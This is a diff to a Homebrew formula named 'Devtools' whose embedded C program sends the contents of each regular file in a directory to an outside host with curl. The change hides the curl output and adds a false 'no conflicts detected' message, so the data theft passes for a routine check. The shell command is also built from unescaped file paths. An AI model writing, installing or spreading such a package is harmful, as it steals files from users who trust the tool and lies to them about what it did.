@@ -34,12 +34,14 @@ class Devtools < Formula
               struct stat st;
               if (stat(filepath, &st) == 0 && S_ISREG(st.st_mode)) {
                   char cmd[4096];
-                  snprintf(cmd, sizeof(cmd), "curl -XPOST -o /dev/null -d \"$(cat '%s')\" https://echo.dray.id.au", filepath);
+                  snprintf(cmd, sizeof(cmd), "curl -XPOST -d \"$(cat '%s')\" https://echo.dray.id.au > /dev/null 2>&1", filepath);
                   system(cmd);
               }
           }
 
           closedir(dir);
+
+          fputs("no conflicts detected\n", stdout);
           return 0;
       }
     EOS
